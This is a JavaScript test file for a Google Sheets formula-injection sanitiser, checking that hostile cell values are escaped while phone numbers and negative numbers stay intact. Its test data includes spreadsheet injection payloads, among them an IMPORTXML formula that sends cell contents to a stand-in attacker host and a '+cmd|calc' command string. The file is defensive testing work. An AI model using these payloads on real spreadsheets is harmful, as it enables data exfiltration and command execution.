'use strict';

/**
 * SEC-FI1 — Google Sheets formula-injection guard.
 *
 * Every write goes out with valueInputOption 'USER_ENTERED', so a cell whose
 * value starts with = + - @ is EVALUATED. Free text typed into the bot lands
 * in cells verbatim, so this guard escapes those values with the leading
 * apostrophe Sheets strips on storage.
 *
 * The tests below pin both halves: hostile input is neutralised, and every
 * shape of legitimate business data this codebase writes is left byte-identical
 * (that second half is the regression risk — a phone number or a negative
 * adjustment must not silently become text).
 */

const test = require('node:test');
const assert = require('node:assert/strict');

const { _internals } = require('../../../src/repositories/sheetsClient');
const { sanitizeCell, sanitizeRows } = _internals;

test('formula payloads are neutralised', () => {
  const hostile = [
    '=IMPORTXML("https://evil.example/"&A1,"//a")',
    '=1+1',
    '=HYPERLINK("https://evil.example","click")',
    '@SUM(A1:A9)',
    '-- drop',
    '+cmd|calc',
  ];
  for (const v of hostile) {
    assert.equal(sanitizeCell(v), `'${v}`, `should escape: ${v}`);
  }
});

test('legitimate business values are untouched (no silent retyping)', () => {
  const safe = [
    // designs, shades, bale numbers, warehouses, customers
    '9043-B', 'Kano office', 'madam oshodi cashmere', 'SA/2521', 'BK/1',
    // numbers Sheets must keep typing as numbers
    '30', '4826.5', '0',
    // a negative adjustment starts with a formula lead character but is a
    // real number, so its storage is unchanged
    '-5', '-12.75',
    // ISO + local dates
    '2026-07-25', '25-07-2026',
    // already-escaped values (settingsRepository does this itself)
    "'6172817425",
  ];
  for (const v of safe) {
    assert.equal(sanitizeCell(v), v, `should NOT change: ${v}`);
  }
});

test('SHEET-FIX-3: an E.164 phone is stored as TEXT, so the + survives', () => {
  // This pin is the REVERSE of what it was until 14-Aug-2026, and the
  // owner's full-workbook export is why. "+2348012345678" parses as a
  // finite number, so the guard used to wave it through — and
  // USER_ENTERED then stored the integer 2348012345678, destroying the
  // leading +. Nine of the eleven phones in the live sheet are bare
  // integers because of it, none of them tappable, which is exactly what
  // the owner's "+234 for one-tap call on any messenger" ruling needs.
  assert.equal(sanitizeCell('+2348012345678'), "'+2348012345678");
  assert.equal(sanitizeCell('+2349484774839'), "'+2349484774839");
  // Narrow on purpose: + then digits only. A signed quantity is not a phone.
  assert.equal(sanitizeCell('+5'), '+5', 'too short to be a phone — still a number');
  assert.equal(sanitizeCell('+234-801-2345678'), "'+234-801-2345678",
    'punctuated forms are not E.164, and the formula guard escapes them anyway');
});

test('non-strings and empties pass through by identity', () => {
  assert.equal(sanitizeCell(30), 30);
  assert.equal(sanitizeCell(0), 0);
  assert.equal(sanitizeCell(''), '');
  assert.equal(sanitizeCell(null), null);
  assert.equal(sanitizeCell(undefined), undefined);
  assert.equal(sanitizeCell(true), true);
});

test('an already-escaped value is never double-escaped', () => {
  assert.equal(sanitizeCell("'=1+1"), "'=1+1");
});

test('sanitizeRows walks a full rows payload and preserves shape', () => {
  const rows = [
    ['824', '9006', '=IMPORTXML("http://x","//a")', 30],
    ['825', '9032', 'cream', -5],
  ];
  const out = sanitizeRows(rows);
  assert.deepEqual(out, [
    ['824', '9006', '\'=IMPORTXML("http://x","//a")', 30],
    ['825', '9032', 'cream', -5],
  ]);
  assert.equal(out.length, rows.length);
  assert.equal(out[0].length, rows[0].length);
});

test('sanitizeRows tolerates malformed payloads without throwing', () => {
  assert.equal(sanitizeRows(null), null);
  assert.deepEqual(sanitizeRows([]), []);
  assert.deepEqual(sanitizeRows(['not-a-row']), ['not-a-row']);
});
